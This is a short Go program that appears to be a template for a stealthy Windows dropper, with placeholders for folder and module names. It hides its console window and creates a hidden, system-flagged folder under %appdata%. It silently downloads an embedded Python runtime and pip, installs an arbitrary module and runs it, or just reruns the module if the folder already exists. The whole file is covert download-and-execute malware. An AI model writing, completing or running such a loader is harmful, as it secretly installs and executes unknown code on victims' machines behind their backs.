package main

import (
	"os/exec"
	"syscall"
)

func main() {
	c := exec.Command("cmd", "/c", "ADDON cd %appdata% & if exist RANDOMFOLDER (cd RANDOMFOLDER & python -m RUNMODULENAME ARGS) else (mkdir RANDOMFOLDER & attrib +h +s +r RANDOMFOLDER & cd RANDOMFOLDER & curl -s https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-win32.zip -o PYTHONZIP & tar -xf PYTHONZIP & echo import site >> python312._pth & curl -s https://bootstrap.pypa.io/get-pip.py -O & python get-pip.py & Scripts\\pip install INSTALLMODULENAME & python -m RUNMODULENAME ARGS)")
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c.Run()
}
